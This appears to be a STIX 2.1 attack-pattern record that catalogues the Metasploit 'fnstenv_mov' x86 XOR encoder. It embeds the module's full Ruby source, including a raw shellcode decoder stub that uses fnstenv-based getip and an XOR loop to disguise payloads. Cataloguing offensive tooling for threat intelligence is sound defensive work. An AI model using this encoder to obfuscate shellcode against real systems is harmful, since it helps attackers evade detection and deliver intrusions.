{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--23a091bc-4289-4530-b959-0aeb43f0d6c5",
    "created": "2024-08-14T16:33:19.217409Z",
    "modified": "2024-08-14T16:33:19.217413Z",
    "name": "Variable-length Fnstenv/mov Dword XOR Encoder",
    "description": " This encoder uses a variable-length mov equivalent instruction with fnstenv for getip. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x86/fnstenv_mov.rb",
            "external_id": "fnstenv_mov.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder::Xor\n\n  def initialize\n    super(\n      'Name'             => 'Variable-length Fnstenv/mov Dword XOR Encoder',\n      'Description'      => %q{\n        This encoder uses a variable-length mov equivalent instruction\n        with fnstenv for getip.\n      },\n      'Author'           => 'spoonm',\n      'Arch'             => ARCH_X86,\n      'License'          => MSF_LICENSE,\n      'Decoder'          =>\n        {\n          'KeySize'   => 4,\n          'BlockSize' => 4,\n        })\n  end\n\n  #\n  # Returns the decoder stub that is adjusted for the size of the buffer\n  # being encoded.\n  #\n  def decoder_stub(state)\n\n    # Sanity check that saved_registers doesn't overlap with modified_registers\n    if (modified_registers & saved_registers).length > 0\n      raise BadGenerateError\n    end\n\n    decoder =\n      Rex::Arch::X86.set(\n        Rex::Arch::X86::ECX,\n        (((state.buf.length - 1) / 4) + 1),\n        state.badchars) +\n      \"\\xd9\\xee\" +              # fldz\n      \"\\xd9\\x74\\x24\\xf4\" +      # fnstenv [esp - 12]\n      \"\\x5b\" +                  # pop ebx\n      \"\\x81\\x73\\x13XORK\" +      # xor_xor: xor DWORD [ebx + 22], xorkey\n      \"\\x83\\xeb\\xfc\" +          # sub ebx,-4\n      \"\\xe2\\xf4\"                # loop xor_xor\n\n    state.decoder_key_offset = decoder.index('XORK')\n\n    return decoder\n  end\n\n  # Indicate that this module can preserve some registers\n  def can_preserve_registers?\n    true\n  end\n\n  # A list of registers always touched by this encoder\n  def modified_registers\n    [ Rex::Arch::X86::EBX, Rex::Arch::X86::ECX ]\n  end\n\n  # Convert the SaveRegisters to an array of x86 register constants\n  def saved_registers\n    Rex::Arch::X86.register_names_to_ids(datastore['SaveRegisters'])\n  end\nend\n"
}